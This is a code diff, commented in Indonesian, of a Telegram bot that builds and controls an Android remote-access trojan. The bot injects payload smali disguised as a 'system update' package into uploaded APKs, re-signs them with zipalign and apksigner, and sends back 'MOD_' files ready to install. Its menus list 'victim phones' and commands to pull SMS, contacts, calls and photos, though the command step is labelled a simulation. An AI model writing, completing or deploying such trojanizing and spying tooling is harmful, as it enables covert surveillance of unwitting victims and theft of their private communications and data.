@@ -17,10 +17,13 @@ KEYSTORE_PASS = "123456"
 KEY_ALIAS = "debugkey"
 PAYLOAD_SMALI_DIR = f"{WORK_DIR}/payload_smali/com/system/update"
 
+# Pastikan path ini sesuai dengan tempat kamu naruh zipalign.jar
+ZIPALIGN_JAR = f"{WORK_DIR}/zipalign.jar" 
+
 os.makedirs(WORK_DIR, exist_ok=True)
 logging.disable(logging.CRITICAL) # Biar layar Termux bersih
 
-user_states = {} # Nyimpen status (lagi nunggu APK atau lagi di menu)
+user_states = {} 
 
 def is_authorized(update: Update):
     return update.effective_chat.id == ALLOWED_CHAT_ID
@@ -45,9 +48,8 @@ def inject_manifest(manifest_path):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_authorized(update): return
     
-    # Kalau dari command /start atau dari tombol back
     chat_id = update.effective_chat.id
-    user_states.pop(chat_id, None) # Reset state
+    user_states.pop(chat_id, None) 
 
     banner = (
         "```\n"
@@ -90,7 +92,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     elif query.data == "menu_device":
-        # (Nanti ini bisa narik dari database SQLite)
         keyboard = [
             [InlineKeyboardButton("📱 HP Korban 1", callback_data="device_1")],
             [InlineKeyboardButton("📱 HP Korban 2", callback_data="device_2")],
@@ -107,7 +108,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await start(update, context)
         
     elif query.data in ["device_1", "device_2"]:
-        # Ini menu kontrol RAT (sama kayak yang kita bikin di awal)
         keyboard = [
             [InlineKeyboardButton("📩 SMS", callback_data="cmd_sms"), InlineKeyboardButton("👥 Kontak", callback_data="cmd_kontak")],
             [InlineKeyboardButton("📞 Telpon", callback_data="cmd_telpon"), InlineKeyboardButton("📸 Foto", callback_data="cmd_foto")],
@@ -120,8 +120,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     elif query.data.startswith("cmd_"):
-        # Simulasi kirim perintah ke APK korban
-        await query.edit_message_text("⏳ Mengirim perintah ke HP korban...\n*(Fitur ini nyambung ke APK RAT)*")
+        await query.edit_message_text("⏳ Mengirim perintah ke HP korban...\n*(Simulasi)*")
 
 # ── PROSES BUILD APK ──
 async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path: str, file_name: str):
@@ -153,14 +152,16 @@ async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_p
 
         await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="🔐 [5/5] Menandatangani APK...")
         signed_apk = f"{apk_new_path}.signed.apk"
-        subprocess.run(f"zipalign -p -f 4 '{apk_new_path}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)
+        
+        # Pakai zipalign.jar yang udah didownload
+        subprocess.run(f"java -jar {ZIPALIGN_JAR} -p -f 4 '{apk_new_path}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)
+        # Pakai apksigner bawaan Termux
         subprocess.run(f"apksigner sign --ks {KEYSTORE_PATH} --ks-pass pass:{KEYSTORE_PASS} --ks-key-alias {KEY_ALIAS} --out '{signed_apk}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)
 
         await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="✅ **BUILD SUKSES!** APK siap di-install:", parse_mode='Markdown')
         with open(signed_apk, "rb") as f:
             await context.bot.send_document(chat_id=ALLOWED_CHAT_ID, document=f, filename=f"MOD_{file_name}")
             
-        # Balikin ke menu awal
         await start(update, context)
             
     except subprocess.CalledProcessError as e:
@@ -177,7 +178,6 @@ async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_p
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_authorized(update): return
     
-    # Cuma nerima APK kalau user lagi di menu "Build APK Baru"
     if user_states.get(ALLOWED_CHAT_ID) != "waiting_apk":
         await update.message.reply_text("❌ Klik menu **Build APK Baru** dulu sebelum mengirim file.")
         return
